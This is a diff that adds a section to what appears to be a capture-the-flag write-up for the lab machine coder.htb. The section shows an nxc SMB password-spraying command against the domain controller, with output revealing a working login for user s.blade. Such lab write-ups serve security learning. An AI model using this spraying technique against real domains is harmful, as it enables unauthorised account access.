@@ -466,5 +466,24 @@ URL: https://teamcity-dev.coder.htb
 
 So a few interesting things from this DB
 
+# Domain Credentials
+
+```python
+❯❯❯ nxc smb dc01.coder.htb -u users.txt -p 'AmcwNO60Zg3vca3o0HDrTC6D' --continue-on-success  
+SMB         10.129.229.190  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:coder.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.190  445    DC01             [-] coder.htb\Administrator:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\Guest:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\krbtgt:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\DC01$:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\e.black:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\c.cage:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\j.briggs:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\l.kang:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+SMB         10.129.229.190  445    DC01             [+] coder.htb\s.blade:AmcwNO60Zg3vca3o0HDrTC6D 
+SMB         10.129.229.190  445    DC01             [-] coder.htb\svc_teamcity:AmcwNO60Zg3vca3o0HDrTC6D STATUS_LOGON_FAILURE 
+```
+
+One of the passwords works on the domain for the user `s.blade`
+
 
 
